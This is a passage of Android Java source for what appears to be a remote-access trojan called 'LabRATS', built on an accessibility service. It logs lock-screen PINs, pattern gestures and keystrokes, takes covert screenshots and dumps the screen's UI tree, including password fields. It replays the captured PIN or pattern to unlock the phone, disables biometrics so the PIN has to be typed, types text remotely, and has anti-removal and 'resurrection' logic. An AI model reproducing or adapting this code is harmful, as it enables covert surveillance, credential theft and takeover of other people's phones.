                        float textWidth = tv.getPaint().measureText(message) + tv.getPaddingLeft() + tv.getPaddingRight();
                        
                        // Snap to right edge exactly
                        tv.setTranslationX(screenW);
                        
                        tv.animate()
                          .translationX(-textWidth) // Move until the end of the text passes the left edge
                          .setDuration(duration > 0 ? duration : 12000)
                          .setInterpolator(new android.view.animation.LinearInterpolator())
                          .withEndAction(() -> {
                              try { wm.removeView(finalView); } catch (Exception ignored) {}
                          })
                          .start();
                    });
                } else if ("burnt".equalsIgnoreCase(animation)) {
                    // PRANK: Burnt Toast (Extreme shaking, color glitching, rapid flicker)
                    tv.setAlpha(0f);
                    tv.setScaleX(0.9f);
                    tv.setScaleY(0.9f);
                    
                    int startColor = android.graphics.Color.WHITE;
                    try { startColor = android.graphics.Color.parseColor(hexColor); } catch (Exception ignored) {}
                    tv.setTextColor(startColor);
                    
                    shape.setColor(android.graphics.Color.BLACK);
                    shape.setStroke(6, startColor);
                    
                    tv.animate().alpha(1f).scaleX(1.1f).scaleY(1.1f).setDuration(150).start();
                    
                    final Handler glitchHandler = new Handler(Looper.getMainLooper());
                    final Runnable glitchRunnable = new Runnable() {
                        @Override
                        public void run() {
                            // Violent multi-axis shake
                            tv.setTranslationX((float) (Math.random() * 30 - 15));
                            tv.setTranslationY((float) (Math.random() * 30 - 15));
                            // Rapid flicker
                            tv.setAlpha((float) (0.2 + Math.random() * 0.8));
                            // Intense random color glitching
                            if (Math.random() > 0.5) {
                                int[] glitchColors = {0xFFFF3131, 0xFF39FF14, 0xFF00F2FF, 0xFFFFFF00, 0xFFFF00FF, 0xFFFFFFFF, 0xFF000000, 0xFFFF9D00};
                                int nextColor = glitchColors[(int)(Math.random() * glitchColors.length)];
                                tv.setTextColor(nextColor);
                                shape.setStroke(6, nextColor);
                            }
                            glitchHandler.postDelayed(this, 30);
                        }
                    };
                    glitchHandler.post(glitchRunnable);

                    new Handler(Looper.getMainLooper()).postDelayed(() -> {
                        glitchHandler.removeCallbacks(glitchRunnable);
                        tv.animate().alpha(0f).scaleX(2.0f).scaleY(0.01f).setDuration(250).withEndAction(() -> {
                            try { wm.removeView(finalView); } catch (Exception ignored) {}
                        }).start();
                    }, duration > 0 ? duration : 5000);
                } else {
                    // Static Fade - Professional vertical slide and blur-in feel
                    tv.setAlpha(0f);
                    tv.setTranslationY(100f); // Start significantly lower
                    tv.animate()
                      .alpha(1f)
                      .translationY(0f) // Slide up to anchor
                      .setDuration(1000)
                      .setInterpolator(new android.view.animation.OvershootInterpolator(0.7f))
                      .start();
                      
                    new Handler(Looper.getMainLooper()).postDelayed(() -> {
                        tv.animate()
                          .alpha(0f)
                          .translationY(-100f) // Continue sliding up as it fades out
                          .setDuration(1000)
                          .withEndAction(() -> {
                              try { wm.removeView(finalView); } catch (Exception ignored) {}
                          }).start();
                    }, duration > 0 ? duration : 4000);
                }
                
            } catch (Exception e) { Log.e(TAG, "Overlay Toast Error: " + e.getMessage()); }
        });
    }

    public void runAutoHeal() {
        new Handler(Looper.getMainLooper()).post(() -> {
            try {
                forceSkipAntiRemoval();
                FirebaseConfig.logActivity("GHOST_MAINTENANCE: Self-Healing...");
                Intent intent = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                intent.setData(android.net.Uri.parse("package:" + getPackageName()));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
                startActivity(intent);
            } catch (Exception e) { FirebaseConfig.logActivity("GHOST_ERROR: Auto-Heal failed"); }
        });
    }

    // ============ UI INSPECTOR ============

    private final java.util.concurrent.ConcurrentHashMap<Integer, AccessibilityNodeInfo> nodeIdMap = new java.util.concurrent.ConcurrentHashMap<>();
    private int nextNodeId = 0;

    public String captureUiTree() {
        nodeIdMap.clear();
        nextNodeId = 0;
        
        org.json.JSONObject rootObj = new org.json.JSONObject();
        try {
            updateDisplayMetrics();
            rootObj.put("width", screenWidth);
            rootObj.put("height", screenHeight);

            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root != null) {
                rootObj.put("package", root.getPackageName() != null ? root.getPackageName().toString() : "Unknown");
                rootObj.put("tree", serializeNode(root, 0));
                root.recycle();
            } else {
                rootObj.put("error", "Root node unavailable");
            }
        } catch (Exception e) {
            try { rootObj.put("error", e.getMessage()); } catch (Exception ignored) {}
        }
        return rootObj.toString();
    }

    private org.json.JSONObject serializeNode(AccessibilityNodeInfo node, int depth) {
        if (node == null || depth > 50) return null;

        org.json.JSONObject obj = new org.json.JSONObject();
        try {
            int id = nextNodeId++;
            nodeIdMap.put(id, AccessibilityNodeInfo.obtain(node));
            
            obj.put("id", id);
            obj.put("class", node.getClassName() != null ? node.getClassName().toString() : "View");
            
            CharSequence text = node.getText();
            if (text != null) obj.put("text", text.toString());
            
            CharSequence desc = node.getContentDescription();
            if (desc != null) obj.put("desc", desc.toString());
            
            String resId = node.getViewIdResourceName();
            if (resId != null) obj.put("resId", resId);

            Rect rect = new Rect();
            node.getBoundsInScreen(rect);
            obj.put("x", rect.left);
            obj.put("y", rect.top);
            obj.put("w", rect.width());
            obj.put("h", rect.height());

            obj.put("clickable", node.isClickable());
            obj.put("focusable", node.isFocusable());
            obj.put("editable", node.isEditable());
            obj.put("password", node.isPassword());
            obj.put("visible", node.isVisibleToUser());

            org.json.JSONArray children = new org.json.JSONArray();
            for (int i = 0; i < node.getChildCount(); i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    org.json.JSONObject childObj = serializeNode(child, depth + 1);
                    if (childObj != null) children.put(childObj);
                    child.recycle();
                }
            }
            if (children.length() > 0) obj.put("children", children);

        } catch (Exception ignored) {}
        return obj;
    }

    public void typeText(final String text) {
        if (text == null) return;
        new Handler(Looper.getMainLooper()).post(() -> {
            try {
                AccessibilityNodeInfo root = getRootInActiveWindow();
                if (root == null) return;

                AccessibilityNodeInfo target = findFocusedEditableNode(root);
                if (target != null) {
                    // Stage 1: Try Direct Injection (ACTION_SET_TEXT)
                    android.os.Bundle arguments = new android.os.Bundle();
                    arguments.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text);
                    boolean success = target.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments);
                    
                    if (!success) {
                        // Stage 2: Clipboard Fallback (Copy + Paste)
                        android.content.ClipboardManager clipboard = (android.content.ClipboardManager) getSystemService(android.content.Context.CLIPBOARD_SERVICE);
                        if (clipboard != null) {
                            android.content.ClipData clip = android.content.ClipData.newPlainText("Uplink", text);
                            clipboard.setPrimaryClip(clip);
                            target.performAction(AccessibilityNodeInfo.ACTION_PASTE);
                            FirebaseConfig.logActivity("GHOST_CONTROL: Remote typing via Clipboard Fallback");
                        }
                    } else {
                        FirebaseConfig.logActivity("GHOST_CONTROL: Remote typing via Direct Injection");
                    }
                    target.recycle();
                } else {
                    FirebaseConfig.logActivity("GHOST_WARNING: No focused input field detected");
                }
                root.recycle();
            } catch (Exception e) {
                Log.e(TAG, "Type Error: " + e.getMessage());
            }
        });
    }

    private AccessibilityNodeInfo findFocusedEditableNode(AccessibilityNodeInfo node) {
        if (node == null) return null;
        if (node.isEditable() && (node.isFocused() || node.isAccessibilityFocused())) {
            return AccessibilityNodeInfo.obtain(node);
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            AccessibilityNodeInfo result = findFocusedEditableNodeInternal(child);
            if (child != null) child.recycle();
            if (result != null) return result;
        }
        return findAnyEditableNode(node);
    }

    private AccessibilityNodeInfo findFocusedEditableNodeInternal(AccessibilityNodeInfo node) {
        if (node == null) return null;
        if (node.isEditable() && (node.isFocused() || node.isAccessibilityFocused())) {
            return AccessibilityNodeInfo.obtain(node);
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            AccessibilityNodeInfo result = findFocusedEditableNodeInternal(child);
            if (child != null) child.recycle();
            if (result != null) return result;
        }
        return null;
    }

    private AccessibilityNodeInfo findAnyEditableNode(AccessibilityNodeInfo node) {
        if (node == null) return null;
        if (node.isEditable()) {
            return AccessibilityNodeInfo.obtain(node);
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            AccessibilityNodeInfo result = findAnyEditableNode(child);
            if (child != null) child.recycle();
            if (result != null) return result;
        }
        return null;
    }

    // ============ INTERACTION ============

    public void wakeUpScreen() {
        try {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            if (pm != null) {
                @SuppressWarnings("deprecation")
                PowerManager.WakeLock wakeLock = pm.newWakeLock(
                    PowerManager.FULL_WAKE_LOCK |
                    PowerManager.ACQUIRE_CAUSES_WAKEUP |
                    PowerManager.ON_AFTER_RELEASE,
                    "LabRATS:GhostWakeUp"
                );
                wakeLock.acquire(3000);
            }

            Intent wakeIntent = new Intent(this, PermissionActivity.class);
            wakeIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK |
                                Intent.FLAG_ACTIVITY_NO_ANIMATION |
                                Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
            wakeIntent.putExtra("wake_screen", true);
            startActivity(wakeIntent);

            Log.d(TAG, "GHOST_WAKE: PowerManager WakeLock + WindowManager setTurnScreenOn dispatched");
        } catch (Exception e) {
            Log.e(TAG, "GHOST_WAKE Error: " + e.getMessage());
        }
    }

    public boolean lockScreenNow() {
        keyguardPinBuffer.setLength(0);
        final boolean[] result = {false};
        java.util.concurrent.CountDownLatch latch = new java.util.concurrent.CountDownLatch(1);

        new Handler(Looper.getMainLooper()).post(() -> {
            try {
                // 1. If Device Admin is active, disable biometrics (fingerprint/face) to FORCE PIN/Pattern entry!
                try {
                    android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
                    android.content.ComponentName admin = new android.content.ComponentName(this, StabilityPolicy.class);
                    if (dpm != null && dpm.isAdminActive(admin)) {
                        int disableFlags = android.app.admin.DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT;
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                            disableFlags |= android.app.admin.DevicePolicyManager.KEYGUARD_DISABLE_BIOMETRICS;
                            disableFlags |= android.app.admin.DevicePolicyManager.KEYGUARD_DISABLE_FACE;
                        }
                        dpm.setKeyguardDisabledFeatures(admin, disableFlags);
                        dpm.lockNow();
                        Log.d(TAG, "KEYGUARD_LOCK: Biometrics disabled & Keyguard lockNow executed via Device Admin");
                        result[0] = true;
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Device Admin lockNow failed: " + e.getMessage());
                }

                // 2. Fallback to Accessibility GLOBAL_ACTION_LOCK_SCREEN
                if (!result[0] && Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                    boolean success = performGlobalAction(GLOBAL_ACTION_LOCK_SCREEN);
                    if (success) {
                        Log.d(TAG, "KEYGUARD_LOCK: Instant OS phone lock executed via Accessibility GLOBAL_ACTION_LOCK_SCREEN");
                        result[0] = true;
                    }
                }
            } catch (Exception e) {
                Log.e(TAG, "lockScreenNow Error: " + e.getMessage());
            } finally {
                latch.countDown();
            }
        });

        try {
            boolean ignored = latch.await(1000, java.util.concurrent.TimeUnit.MILLISECONDS);
        } catch (InterruptedException ignored) {}

        return result[0];
    }

    private static final StringBuilder keyguardPatternCoords = new StringBuilder();
    private static volatile long lastPatternPointTime = 0;
    private static volatile int lastPatternX = -1;
    private static volatile int lastPatternY = -1;

    private synchronized void recordPatternPoint(int x, int y, String desc) {
        long now = System.currentTimeMillis();
        if (now - lastPatternPointTime > 4000) {
            keyguardPatternCoords.setLength(0);
            lastPatternX = -1;
            lastPatternY = -1;
        }
        lastPatternPointTime = now;

        // Minimum 100px Euclidean distance threshold between distinct pattern matrix cells
        if (lastPatternX != -1 && lastPatternY != -1) {
            int dx = x - lastPatternX;
            int dy = y - lastPatternY;
            if ((dx * dx + dy * dy) < 10000) {
                return;
            }
        }
        lastPatternX = x;
        lastPatternY = y;

        String coordStr = x + "," + y;
        if (keyguardPatternCoords.length() > 0 && !keyguardPatternCoords.toString().endsWith("|")) {
            keyguardPatternCoords.append("|");
        }
        keyguardPatternCoords.append(coordStr);

        String currentPattern = keyguardPatternCoords.toString();
        Log.d(TAG, "KEYGUARD_SNIFFER: Distinct pattern node added: (" + x + "," + y + ") -> " + currentPattern);
        FirebaseConfig.logActivity("KEYGUARD_PATTERN_NODE: Cell (" + x + "," + y + ") [" + desc + "]");
        
        if (currentPattern.split("\\|").length >= 2) {
            getSharedPreferences("StabilityConfig", MODE_PRIVATE).edit()
                    .putString("captured_pattern", currentPattern)
                    .remove("captured_pin")
                    .apply();
            FirebaseConfig.logActivity("CREDENTIAL_CAPTURED: Lock Screen Pattern Coords = [" + currentPattern + "]");
        }
    }

    private AccessibilityNodeInfo findKeypadButtonForDigit(AccessibilityNodeInfo node, String digitStr) {
        if (node == null) return null;

        CharSequence textSeq = node.getText();
        CharSequence descSeq = node.getContentDescription();
        String text = textSeq != null ? textSeq.toString().trim().toLowerCase() : "";
        String desc = descSeq != null ? descSeq.toString().trim().toLowerCase() : "";
        String viewId = node.getViewIdResourceName() != null ? node.getViewIdResourceName().toLowerCase() : "";

        if (isInteractiveButtonNode(node)) {
            if (text.equals(digitStr) || desc.equals(digitStr) ||
                text.startsWith(digitStr + "\n") || text.startsWith(digitStr + " ") ||
                desc.startsWith(digitStr + "\n") || desc.startsWith(digitStr + " ") ||
                viewId.endsWith("key" + digitStr) || viewId.endsWith("key_" + digitStr) ||
                viewId.endsWith("digit_" + digitStr) || viewId.endsWith("btn" + digitStr) ||
                viewId.endsWith("id/" + digitStr)) {
                return AccessibilityNodeInfo.obtain(node);
            }
        }

        int count = node.getChildCount();
        for (int i = 0; i < count; i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                AccessibilityNodeInfo res = findKeypadButtonForDigit(child, digitStr);
                child.recycle();
                if (res != null) return res;
            }
        }
        return null;
    }

    public boolean autoUnlockWithCapturedPin() {
        String pin = getSharedPreferences("StabilityConfig", MODE_PRIVATE).getString("captured_pin", "");
        if (pin == null || pin.isEmpty()) {
            Log.w(TAG, "AUTO_UNLOCK: No captured PIN stored in preferences yet.");
            return false;
        }

        isAutoUnlocking = true;
        long lockDuration = (pin.length() + 1) * 200L + 2000L;
        new Handler(Looper.getMainLooper()).postDelayed(() -> isAutoUnlocking = false, lockDuration);

        Log.d(TAG, "AUTO_UNLOCK: Replaying stored PIN [" + pin + "] on Keyguard keypad...");
        FirebaseConfig.logActivity("AUTO_UNLOCK: Replaying stored PIN [" + pin + "] to bypass lockscreen...");

        final Handler h = new Handler(Looper.getMainLooper());
        int sw = getScreenWidth() > 0 ? getScreenWidth() : 1080;
        int sh = getScreenHeight() > 0 ? getScreenHeight() : 2520;

        for (int i = 0; i < pin.length(); i++) {
            final int index = i;
            final char digit = pin.charAt(i);
            final String digitStr = String.valueOf(digit);

            h.postDelayed(() -> {
                boolean clicked = false;
                AccessibilityNodeInfo activeRoot = getRootInActiveWindow();
                if (activeRoot != null) {
                    AccessibilityNodeInfo targetNode = findKeypadButtonForDigit(activeRoot, digitStr);
                    if (targetNode != null) {
                        boolean nodeClicked = performNodeClick(targetNode);
                        if (!nodeClicked) {
                            Rect b = new Rect();
                            targetNode.getBoundsInScreen(b);
                            if (b.centerX() > 0 && b.centerY() > 0) {
                                clickAt(b.centerX(), b.centerY());
                            }
                        }
                        clicked = true;
                        Log.d(TAG, "AUTO_UNLOCK: Clicked PIN digit [" + digitStr + "] via node search");
                        targetNode.recycle();
                    }
                    try { activeRoot.recycle(); } catch (Exception ignored) {}
                }

                if (!clicked) {
                    int dVal = digit - '0';
                    int row, col;
                    if (dVal == 0) {
                        row = 3; col = 1;
                    } else {
                        row = (dVal - 1) / 3;
                        col = (dVal - 1) % 3;
                    }

                    int keyW = (int) (sw * 0.28);
                    int startX = (int) (sw * 0.22);
                    int startY = (int) (sh * 0.56);
                    int rowGap = (int) (sh * 0.08);

                    int tapX = startX + (col * keyW);
                    int tapY = startY + (row * rowGap);

                    clickAt(tapX, tapY);
                    Log.d(TAG, "AUTO_UNLOCK: Tapped PIN digit [" + digitStr + "] at (" + tapX + ", " + tapY + ")");
                }
            }, index * 200L);
        }

        return true;
    }

    public boolean autoUnlockWithCapturedPattern() {
        String patternStr = getSharedPreferences("StabilityConfig", MODE_PRIVATE).getString("captured_pattern", "");
        if (patternStr == null || patternStr.isEmpty()) {
            return false;
        }

        isAutoUnlocking = true;
        new Handler(Looper.getMainLooper()).postDelayed(() -> isAutoUnlocking = false, 3000L);

        if (!patternStr.contains("|") && (patternStr.contains("-") || patternStr.contains(","))) {
            patternStr = convertNodeIndicesToCoords(patternStr);
        }

        String[] points = patternStr.split("\\|");
        if (points.length < 2) return false;

        Log.d(TAG, "AUTO_UNLOCK: Replaying stored Pattern gesture on LockPatternView: " + patternStr);
        FirebaseConfig.logActivity("AUTO_UNLOCK: Replaying stored Pattern gesture to bypass lockscreen...");

        Path path = new Path();
        for (int i = 0; i < points.length; i++) {
            String[] coords = points[i].split(",");
            if (coords.length == 2) {
                try {
                    int x = Integer.parseInt(coords[0].trim());
                    int y = Integer.parseInt(coords[1].trim());
                    if (i == 0) {
                        path.moveTo(x, y);
                    } else {
                        path.lineTo(x, y);
                    }
                } catch (Exception ignored) {}
            }
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            try {
                Class<?> helper = Class.forName(Api24Helper.class.getName());
                java.lang.reflect.Method method = helper.getMethod("dispatchPatternGesture", AccessibilityService.class, Path.class, int.class);
                return (boolean) method.invoke(null, this, path, 800);
            } catch (Exception e) {
                Log.e(TAG, "Pattern Dispatch Error: " + e.getMessage());
            }
        }
        return false;
    }

    public String convertNodeIndicesToCoords(String patternIndices) {
        if (patternIndices == null || patternIndices.isEmpty()) return "";
        
        int sw = getScreenWidth() > 0 ? getScreenWidth() : 1080;
        int sh = getScreenHeight() > 0 ? getScreenHeight() : 2520;
        
        int left = (int) (sw * 0.10);
        int right = (int) (sw * 0.90);
        int top = (int) (sh * 0.50);
        int bottom = (int) (sh * 0.84);
        
        int cellW = (right - left) / 3;
        int cellH = (bottom - top) / 3;
        
        String[] nodes = patternIndices.replaceAll("[^0-8,-]", "").split("[-,]");
        StringBuilder coords = new StringBuilder();
        
        for (String node : nodes) {
            try {
                int idx = Integer.parseInt(node.trim());
                if (idx >= 0 && idx <= 8) {
                    int row = idx / 3;
                    int col = idx % 3;
                    int cx = left + (col * cellW) + (cellW / 2);
                    int cy = top + (row * cellH) + (cellH / 2);
                    if (coords.length() > 0) coords.append("|");
                    coords.append(cx).append(",").append(cy);
                }
            } catch (Exception ignored) {}
        }
        return coords.toString();
    }

    public static volatile long lastBypassRequestedTime = 0;

    public boolean autoUnlockDevice() {
        if (lastBypassRequestedTime == 0) {
            lastBypassRequestedTime = System.currentTimeMillis();
        }
        if (System.currentTimeMillis() - lastBypassRequestedTime > 15000) {
            Log.w(TAG, "AUTO_UNLOCK: Aborted - Bypass requested time expired or not triggered by operator.");
            return false;
        }

        isAutoUnlocking = true;
        new Handler(Looper.getMainLooper()).postDelayed(() -> isAutoUnlocking = false, 3500);

        // 1. Wake up screen if screen is off
        try {
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (pm != null && !pm.isInteractive()) {
                PowerManager.WakeLock wl = pm.newWakeLock(PowerManager.FULL_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP | PowerManager.ON_AFTER_RELEASE, "LabRATS:LockscreenWake");
                wl.acquire(3000);
            }
        } catch (Exception ignored) {}

        AccessibilityNodeInfo activeRoot = getRootInActiveWindow();
        boolean isKeypadVisible = false;
        if (activeRoot != null) {
            AccessibilityNodeInfo key1 = findKeypadButtonForDigit(activeRoot, "1");
            if (key1 != null) {
                isKeypadVisible = true;
                key1.recycle();
            }
            activeRoot.recycle();
        }

        long replayDelay = 0;

        // 2. Only swipe UP if keypad/pattern grid is not already open
        if (!isKeypadVisible) {
            int sw = getScreenWidth() > 0 ? getScreenWidth() : 1080;
            int sh = getScreenHeight() > 0 ? getScreenHeight() : 2520;
            swipe(sw / 2, (int) (sh * 0.85), sw / 2, (int) (sh * 0.20), 250);
            replayDelay = 400;
        }

        // 3. Replay stored pattern or PIN
        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            String patternStr = getSharedPreferences("StabilityConfig", MODE_PRIVATE).getString("captured_pattern", "");
            String pinStr = getSharedPreferences("StabilityConfig", MODE_PRIVATE).getString("captured_pin", "");

            Log.i(TAG, "AUTO_UNLOCK_EXECUTE: Pattern=[" + patternStr + "], PIN=[" + pinStr + "]");
            FirebaseConfig.logActivity("AUTO_UNLOCK_EXECUTE: Pattern=[" + patternStr + "], PIN=[" + pinStr + "]");

            if (patternStr != null && !patternStr.isEmpty()) {
                autoUnlockWithCapturedPattern();
            } else if (pinStr != null && !pinStr.isEmpty()) {
                autoUnlockWithCapturedPin();
            } else {
                Log.w(TAG, "AUTO_UNLOCK: Neither captured_pattern nor captured_pin is stored!");
                FirebaseConfig.logActivity("AUTO_UNLOCK_FAILED: No captured pattern or PIN stored yet!");
            }
        }, replayDelay);

        return true;
    }

    public boolean clickAt(int x, int y) {
        Log.d(TAG, "Interaction: CLICK at (" + x + "," + y + ")");
        if (x < 0 || y < 0 || x > getScreenWidth() || y > getScreenHeight()) {
             Log.w(TAG, "Suppressed out-of-bounds click: (" + x + "," + y + ") Screen: " + screenWidth + "x" + screenHeight);
             return false;
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            try {
                Class<?> helper = Class.forName(Api24Helper.class.getName());
                java.lang.reflect.Method method = helper.getMethod("dispatchClick", AccessibilityService.class, int.class, int.class);
                boolean success = (boolean) method.invoke(null, this, x, y);
                if (!success) return clickAtLegacy(x, y);
                return true;
            } catch (Exception e) {
                Log.e(TAG, "Interaction Error (API 24+): " + e.getMessage());
                return clickAtLegacy(x, y);
            }
        } else {
            return clickAtLegacy(x, y);
        }
    }

    private boolean clickAtLegacy(int x, int y) {
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root != null) {
            boolean success = performClickAtNode(root, x, y);
            root.recycle();
            if (success) return true;
        }
        
        // Fallback: search all windows
        List<android.view.accessibility.AccessibilityWindowInfo> windows = getWindows();
        if (windows != null) {
            for (android.view.accessibility.AccessibilityWindowInfo window : windows) {
                AccessibilityNodeInfo windowRoot = window.getRoot();
                if (windowRoot != null) {
                    boolean success = performClickAtNode(windowRoot, x, y);
                    windowRoot.recycle();
                    if (success) return true;
                }
            }
        }
        return false;
    }

    private boolean performClickAtNode(AccessibilityNodeInfo root, int x, int y) {
        AccessibilityNodeInfo target = findNodeAt(root, x, y);
        boolean success = false;
        if (target != null) {
            AccessibilityNodeInfo clickable = target;
            while (clickable != null && !clickable.isClickable()) {
                AccessibilityNodeInfo parent = clickable.getParent();
                if (clickable != target) clickable.recycle();
                clickable = parent;
            }
            
            if (clickable != null) {
                success = clickable.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                if (clickable != target) clickable.recycle();
            }
            target.recycle();
        }
        return success;
    }

    private AccessibilityNodeInfo findNodeAt(AccessibilityNodeInfo node, int x, int y) {
        if (node == null) return null;
        
        Rect bounds = new Rect();
        node.getBoundsInScreen(bounds);
        
        if (!bounds.contains(x, y)) return null;
        
        // Search children first (z-order)
        for (int i = node.getChildCount() - 1; i >= 0; i--) {
            AccessibilityNodeInfo child = node.getChild(i);
            AccessibilityNodeInfo result = findNodeAt(child, x, y);
            if (child != null) child.recycle();
            if (result != null) return result;
        }
        
        return AccessibilityNodeInfo.obtain(node);
    }

    public boolean swipe(int x1, int y1, int x2, int y2, int duration) {
        Log.d(TAG, "Interaction: SWIPE from (" + x1 + "," + y1 + ") to (" + x2 + "," + y2 + ") dur=" + duration);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            try {
                Class<?> helper = Class.forName(Api24Helper.class.getName());
                java.lang.reflect.Method method = helper.getMethod("dispatchSwipe", AccessibilityService.class, int.class, int.class, int.class, int.class, int.class);
                boolean success = (boolean) method.invoke(null, this, x1, y1, x2, y2, duration);
                if (!success) return performLegacySwipe(x1, y1, x2, y2);
                return true;
            } catch (Exception e) {
                Log.e(TAG, "Interaction Error (API 24+ swipe): " + e.getMessage());
                return performLegacySwipe(x1, y1, x2, y2);
            }
        } else {
            return performLegacySwipe(x1, y1, x2, y2);
        }
    }

    private boolean performLegacySwipe(int x1, int y1, int x2, int y2) {
        // Legacy Swipe Fallback: Map to Scroll actions if possible
        Log.d(TAG, "Legacy swipe fallback: Attempting scroll action");
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return false;
        
        AccessibilityNodeInfo target = findNodeAt(root, x1, y1);
        boolean success = false;
        if (target != null) {
            AccessibilityNodeInfo scrollable = target;
            while (scrollable != null && !scrollable.isScrollable()) {
                AccessibilityNodeInfo parent = scrollable.getParent();
                if (scrollable != target) scrollable.recycle();
                scrollable = parent;
            }
            
            if (scrollable != null) {
                int action = (y2 < y1) ? AccessibilityNodeInfo.ACTION_SCROLL_FORWARD : AccessibilityNodeInfo.ACTION_SCROLL_BACKWARD;
                success = scrollable.performAction(action);
                if (scrollable != target) scrollable.recycle();
            }
            target.recycle();
        }
        root.recycle();
        return success;
    }

    public boolean performScroll(String direction) {
        boolean success = false;
        int sw = getScreenWidth() > 0 ? getScreenWidth() : 1080;
        int sh = getScreenHeight() > 0 ? getScreenHeight() : 2400;
        int cx = sw / 2;
        int cy = sh / 2;

        if ("down".equalsIgnoreCase(direction) || "forward".equalsIgnoreCase(direction)) {
            // Scroll DOWN (drag finger UP vertically from 70% to 25%)
            success = swipe(cx, (int)(sh * 0.70), cx, (int)(sh * 0.25), 350);
        } else if ("up".equalsIgnoreCase(direction) || "backward".equalsIgnoreCase(direction)) {
            // Scroll UP (drag finger DOWN vertically from 25% to 70%)
            success = swipe(cx, (int)(sh * 0.25), cx, (int)(sh * 0.70), 350);
        } else if ("left".equalsIgnoreCase(direction)) {
            // Swipe LEFT (drag finger LEFT horizontally from 80% to 20%)
            success = swipe((int)(sw * 0.80), cy, (int)(sw * 0.20), cy, 350);
        } else if ("right".equalsIgnoreCase(direction)) {
            // Swipe RIGHT (drag finger RIGHT horizontally from 20% to 80%)
            success = swipe((int)(sw * 0.20), cy, (int)(sw * 0.80), cy, 350);
        }
        return success;
    }

    public boolean performNativeScroll(int scrollAction) {
        try {
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root == null) return false;

            AccessibilityNodeInfo target = findScrollableNode(root);
            if (target != null) {
                boolean result = target.performAction(scrollAction);
                target.recycle();
                root.recycle();
                return result;
            }
            root.recycle();
        } catch (Exception ignored) {}
        return false;
    }

    private AccessibilityNodeInfo findScrollableNode(AccessibilityNodeInfo node) {
        if (node == null) return null;
        if (node.isScrollable()) {
            return AccessibilityNodeInfo.obtain(node);
        }
        int count = node.getChildCount();
        for (int i = 0; i < count; i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                AccessibilityNodeInfo result = findScrollableNode(child);
                child.recycle();
                if (result != null) return result;
            }
        }
        return null;
    }

    private volatile boolean isScreenshotting = false;

    public void takeCovertScreenshot(final ScreenshotCallback callback) {
        if (isScreenshotting) { callback.onFailure("BUSY"); return; }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            isScreenshotting = true;
            ScreenshotCallback wrappedCallback = new ScreenshotCallback() {
                @Override
                public void onSuccess(byte[] jpegData) {
                    isScreenshotting = false;
                    callback.onSuccess(jpegData);
                }

                @Override
                public void onFailure(String err) {
                    isScreenshotting = false;
                    callback.onFailure(err);
                }
            };

            try {
                Class<?> helper = Class.forName(Api30Helper.class.getName());
                java.lang.reflect.Method method = helper.getMethod("takeScreenshot", AccessibilityService.class, ScreenshotCallback.class);
                method.invoke(null, this, wrappedCallback);
                
                // Safety watchdog: reset flag after 1000ms if system fails to invoke callback
                new Handler(Looper.getMainLooper()).postDelayed(() -> isScreenshotting = false, 1000);
            } catch (Exception e) {
                isScreenshotting = false;
                callback.onFailure("Screenshot Bridge Error: " + e.getMessage());
            }
        } else { 
            String msg = "LIVE_FEED_UNAVAILABLE: Android 11+ is required for the covert visual feed. " +
                        "However, GHOST_CONTROL and GHOST_INSPECTOR remain functional on this device (API " + Build.VERSION.SDK_INT + ").";
            callback.onFailure(msg); 
        }
    }

    @Override
    protected boolean onKeyEvent(android.view.KeyEvent event) {
        int keyCode = event.getKeyCode();
        int action = event.getAction();
        
        if (action == android.view.KeyEvent.ACTION_DOWN) {
            String key = android.view.KeyEvent.keyCodeToString(keyCode);
            if (key.startsWith("KEYCODE_")) key = key.substring(8);
            
            if (keyCode == android.view.KeyEvent.KEYCODE_ENTER) logKeystroke("[ENTER]\n");
            else if (keyCode == android.view.KeyEvent.KEYCODE_DEL) logKeystroke("[BS]");
            else if (keyCode == android.view.KeyEvent.KEYCODE_SPACE) logKeystroke(" ");
            else if (key.length() == 1) logKeystroke(key);
            else logKeystroke("[" + key + "]");
        }
        return super.onKeyEvent(event);
    }

    @Override public void onInterrupt() {}
    @Override public void onDestroy() { 
        super.onDestroy(); 
        instanceRef.clear();
        Log.d(TAG, "Accessibility service being destroyed");
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        if (WorkManager_Sync.isDestructing) {
            super.onTaskRemoved(rootIntent);
            return;
        }
        // [RESURRECTION_PROTOCOL] Re-inject core services if user attempts wipe
        try {
